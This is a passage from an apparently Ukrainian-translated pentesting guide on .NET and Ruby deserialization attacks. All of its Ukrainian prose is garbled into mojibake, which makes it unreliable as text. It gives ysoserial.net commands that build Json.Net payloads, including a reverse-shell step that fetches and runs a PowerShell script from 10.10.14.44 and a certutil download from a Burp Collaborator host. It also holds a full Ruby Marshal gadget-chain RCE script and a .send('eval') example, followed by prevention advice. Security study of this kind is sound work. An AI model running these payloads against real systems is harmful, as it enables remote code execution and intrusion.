* **`--formatter`**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ –º–µ—Ç–æ–¥—É –¥–ª—è —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –µ–∫—Å–ø–ª–æ–π—Ç—É (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏, —è–∫–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç—É –∂ —Å–∞–º—É –¥–ª—è —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó).
* **`--output`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏, —á–∏ —Ö–æ—á–µ—Ç–µ –≤–∏ –µ–∫—Å–ø–ª–æ–π—Ç —É **—Å–∏—Ä–æ–º—É** –∞–±–æ **base64** –∑–∞–∫–æ–¥–æ–≤–∞–Ω–æ–º—É –≤–∏–≥–ª—è–¥—ñ. _–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **ysoserial.net** –±—É–¥–µ **–∫–æ–¥—É–≤–∞—Ç–∏** –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **UTF-16LE** (–∫–æ–¥—É–≤–∞–Ω–Ω—è, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —É Windows), —Ç–æ–º—É, —è–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ —Å–∏—Ä–∏–π —ñ –ø—Ä–æ—Å—Ç–æ –∑–∞–∫–æ–¥—É—î—Ç–µ –π–æ–≥–æ –∑ –∫–æ–Ω—Å–æ–ª—ñ Linux, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—ñ—Ç–∫–Ω—É—Ç–∏—Å—è –∑ –¥–µ—è–∫–∏–º–∏ **–ø—Ä–æ–±–ª–µ–º–∞–º–∏ —Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ –∫–æ–¥—É–≤–∞–Ω–Ω—è**, —è–∫—ñ –∑–∞–≤–∞–¥—è—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç—É –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º (–≤ HTB JSON box –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ø—Ä–∞—Ü—é–≤–∞–ª–æ —è–∫ –≤ UTF-16LE, —Ç–∞–∫ —ñ –≤ ASCII, –∞–ª–µ —Ü–µ –Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–æ–Ω–æ –∑–∞–≤–∂–¥–∏ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏)._
* **`--plugin`** ysoserial.net –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–ª–∞–≥—ñ–Ω–∏ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Ñ—Ä–µ–π–º–≤–æ—Ä–∫—ñ–≤**, —Ç–∞–∫–∏—Ö —è–∫ ViewState.

#### –ë—ñ–ª—å—à–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ ysoserial.net

* `--minify` –Ω–∞–¥–∞—Å—Ç—å **–º–µ–Ω—à–µ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è** (—è–∫—â–æ —Ü–µ –º–æ–∂–ª–∏–≤–æ)
* `--raf -f Json.Net -c "anything"` –¶–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –≤—Å—ñ –≥–∞–¥–∂–µ—Ç–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ –Ω–∞–¥–∞–Ω–∏–º —Ñ–æ—Ä–º–∞—Ç–µ—Ä–æ–º (`Json.Net` —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É)
* `--sf xml` –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫–∞–∑–∞—Ç–∏ –≥–∞–¥–∂–µ—Ç** (`-g`), —ñ ysoserial.net —à—É–∫–∞—Ç–∏–º–µ —Ñ–æ—Ä–º–∞—Ç–µ—Ä–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å "xml" (–±–µ–∑ —É—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä—É)

**–ü—Ä–∏–∫–ª–∞–¥–∏ ysoserial** –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** –º–∞—î —Ç–∞–∫–æ–∂ **–¥—É–∂–µ —Ü—ñ–∫–∞–≤–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä**, —è–∫–∏–π –¥–æ–ø–æ–º–∞–≥–∞—î –∫—Ä–∞—â–µ –∑—Ä–æ–∑—É–º—ñ—Ç–∏, —è–∫ –ø—Ä–∞—Ü—é—î –∫–æ–∂–µ–Ω –µ–∫—Å–ø–ª–æ–π—Ç: `--test`\
–Ø–∫—â–æ –≤–∏ –≤–∫–∞–∂–µ—Ç–µ —Ü–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä, **ysoserial.net** **—Å–ø—Ä–æ–±—É—î** **–µ–∫—Å–ø–ª–æ–π—Ç –ª–æ–∫–∞–ª—å–Ω–æ,** —â–æ–± –≤–∏ –º–æ–≥–ª–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–∞—à payload –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ.\
–¶–µ–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∫–æ—Ä–∏—Å–Ω–∏–π, –æ—Å–∫—ñ–ª—å–∫–∏, —è–∫—â–æ –≤–∏ –ø–µ—Ä–µ–≥–ª—è–Ω–µ—Ç–µ –∫–æ–¥, –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —à–º–∞—Ç–∫–∏ –∫–æ–¥—É, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ (–∑ [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –µ–∫—Å–ø–ª–æ–π—Ç—É –∫–æ–¥ –≤–∏–∫–ª–∏–∫–∞—Ç–∏–º–µ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
–£ **–ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –∫–æ–¥—ñ —î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É**. –¢–æ–∂, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —â–æ—Å—å –ø–æ–¥—ñ–±–Ω–µ –≤ .Net –¥–æ–¥–∞—Ç–∫—É, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ, –π–º–æ–≤—ñ—Ä–Ω–æ, —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ —Ç–∞–∫–æ–∂ –≤—Ä–∞–∑–ª–∏–≤–∏–π.\
–û—Ç–∂–µ, –ø–∞—Ä–∞–º–µ—Ç—Ä **`--test`** –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –∑—Ä–æ–∑—É–º—ñ—Ç–∏, **—è–∫—ñ —á–∞—Å—Ç–∏–Ω–∏ –∫–æ–¥—É –≤—Ä–∞–∑–ª–∏–≤—ñ** –¥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫–∏–π –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **ysoserial.net**.

### ViewState

–ü–æ–¥–∏–≤—ñ—Ç—å—Å—è –Ω–∞ [—Ü–µ–π POST –ø—Ä–æ **—Ç–µ, —è–∫ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä \_\_ViewState .Net**](exploiting-\_\_viewstate-parameter.md), —â–æ–± **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥.** –Ø–∫—â–æ –≤–∏ **–≤–∂–µ –∑–Ω–∞—î—Ç–µ —Å–µ–∫—Ä–µ—Ç–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∂–µ—Ä—Ç–≤–æ—é, [**–ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π –ø–æ—Å—Ç, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevention

–©–æ–± –∑–º–µ–Ω—à–∏—Ç–∏ —Ä–∏–∑–∏–∫–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é –≤ .Net:

* **–£–Ω–∏–∫–∞–π—Ç–µ –¥–æ–∑–≤–æ–ª—è—Ç–∏ –ø–æ—Ç–æ–∫–∞–º –¥–∞–Ω–∏—Ö –≤–∏–∑–Ω–∞—á–∞—Ç–∏ —Å–≤–æ—ó —Ç–∏–ø–∏ –æ–±'—î–∫—Ç—ñ–≤.** –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `DataContractSerializer` –∞–±–æ `XmlSerializer`, –∫–æ–ª–∏ —Ü–µ –º–æ–∂–ª–∏–≤–æ.
* **–î–ª—è `JSON.Net` –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å `TypeNameHandling` –Ω–∞ `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **–£–Ω–∏–∫–∞–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `JavaScriptSerializer` –∑ `JavaScriptTypeResolver`.**
* **–û–±–º–µ–∂—Ç–µ —Ç–∏–ø–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ**, —Ä–æ–∑—É–º—ñ—é—á–∏ –≤—Ä–æ–¥–∂–µ–Ω—ñ —Ä–∏–∑–∏–∫–∏ –∑ —Ç–∏–ø–∞–º–∏ .Net, —Ç–∞–∫–∏–º–∏ —è–∫ `System.IO.FileInfo`, —è–∫—ñ –º–æ–∂—É—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∞—Ç–∞–∫ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ.
* **–ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –∑ —Ç–∏–ø–∞–º–∏, —â–æ –º–∞—é—Ç—å —Ä–∏–∑–∏–∫–æ–≤–∞–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ**, —Ç–∞–∫–∏–º–∏ —è–∫ `System.ComponentModel.DataAnnotations.ValidationException` –∑ –π–æ–≥–æ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—é `Value`, —è–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∞.
* **–ù–∞–¥—ñ–π–Ω–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–π—Ç–µ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—é–≤–∞–Ω–Ω—è —Ç–∏–ø—ñ–≤**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–ø–ª–∏–≤—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—ñ–≤ –Ω–∞ –ø—Ä–æ—Ü–µ—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —â–æ —Ä–æ–±–∏—Ç—å –Ω–∞–≤—ñ—Ç—å `DataContractSerializer` –∞–±–æ `XmlSerializer` –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏.
* **–í–ø—Ä–æ–≤–∞–¥—å—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—ñ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ `SerializationBinder` –¥–ª—è `BinaryFormatter` —ñ `JSON.Net`.
* **–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –≤—ñ–¥–æ–º–∏—Ö –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó** –≤ .Net —ñ –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ç–æ—Ä–∏ –Ω–µ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—é—é—Ç—å —Ç–∞–∫—ñ —Ç–∏–ø–∏.
* **–Ü–∑–æ–ª—é–π—Ç–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —Ä–∏–∑–∏–∫–æ–≤–∞–Ω–∏–π –∫–æ–¥** –≤—ñ–¥ –∫–æ–¥—É –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –µ–∫—Å–ø–æ–Ω—É–≤–∞–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `System.Windows.Data.ObjectDataProvider` –≤ WPF –¥–æ–¥–∞—Ç–∫–∞—Ö, –¥–æ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª –¥–∞–Ω–∏—Ö.

### **References**

* –ü–∞–ø—ñ—Ä –ø—Ä–æ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é JSON –≤ Java —Ç–∞ .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** –¥–æ–ø–æ–≤—ñ–¥—å: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) —Ç–∞ —Å–ª–∞–π–¥–∏: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

–£ Ruby —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥–≤–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ —É –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ **marshal**. –ü–µ—Ä—à–∏–π –º–µ—Ç–æ–¥, –≤—ñ–¥–æ–º–∏–π —è–∫ **dump**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –≤ –±–∞–π—Ç–æ–≤–∏–π –ø–æ—Ç—ñ–∫. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é. –ù–∞–≤–ø–∞–∫–∏, –¥—Ä—É–≥–∏–π –º–µ—Ç–æ–¥, **load**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –±–∞–π—Ç–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫—É –Ω–∞–∑–∞–¥ –≤ –æ–±'—î–∫—Ç, –ø—Ä–æ—Ü–µ—Å, –≤—ñ–¥–æ–º–∏–π —è–∫ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è.

–î–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –æ–±'—î–∫—Ç—ñ–≤ **Ruby –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î HMAC (Hash-Based Message Authentication Code)**, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î —Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å —ñ –∞–≤—Ç–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å –¥–∞–Ω–∏—Ö. –ö–ª—é—á, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏, –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º—É –∑ –∫—ñ–ª—å–∫–æ—Ö –º–æ–∂–ª–∏–≤–∏—Ö –º—ñ—Å—Ü—å:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**–ì–µ–Ω–µ—Ä–∞–ª—ñ–∑–æ–≤–∞–Ω–∞ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è Ruby 2.X –¥–æ RCE –≥–∞–¥–∂–µ—Ç–Ω–æ–≥–æ –ª–∞–Ω—Ü—é–≥–∞ (–±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
–Ü–Ω—à–∞ RCE –ª–∞–Ω—Ü—é–≥ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() –º–µ—Ç–æ–¥

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), —è–∫—â–æ –¥–µ—è–∫—ñ –Ω–µ–æ—á–∏—â–µ–Ω—ñ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å –¥–æ –º–µ—Ç–æ–¥—É `.send()` –æ–±'—î–∫—Ç–∞ ruby, —Ü–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î **–≤–∏–∫–ª–∏–∫–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —ñ–Ω—à–∏–π –º–µ—Ç–æ–¥** –æ–±'—î–∫—Ç–∞ –∑ –±—É–¥—å-—è–∫–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–ª–∏–∫ eval, –∞ –ø–æ—Ç—ñ–º ruby –∫–æ–¥ —è–∫ –¥—Ä—É–≥–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –ª–∏—à–µ –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä **`.send()`** –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º, —è–∫ –∑–≥–∞–¥—É–≤–∞–ª–æ—Å—è –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –æ–ø–∏—Å—ñ, –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –º–µ—Ç–æ–¥ –æ–±'—î–∫—Ç–∞, —è–∫–∏–π **–Ω–µ –ø–æ—Ç—Ä–µ–±—É—î –∞—Ä–≥—É–º–µ–Ω—Ç—ñ–≤** –∞–±–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∏ —è–∫–æ–≥–æ –º–∞—é—Ç—å **–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**.\
–î–ª—è —Ü—å–æ–≥–æ –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ –º–µ—Ç–æ–¥–∏ –æ–±'—î–∫—Ç–∞, —â–æ–± **–∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ —Ü—ñ–∫–∞–≤—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ü–∏–º –≤–∏–º–æ–≥–∞–º**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### –Ü–Ω—à—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –±—É–ª–∞ –≤–∑—è—Ç–∞[ **–∑ —Ü—å–æ–≥–æ –±–ª–æ–≥—É**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

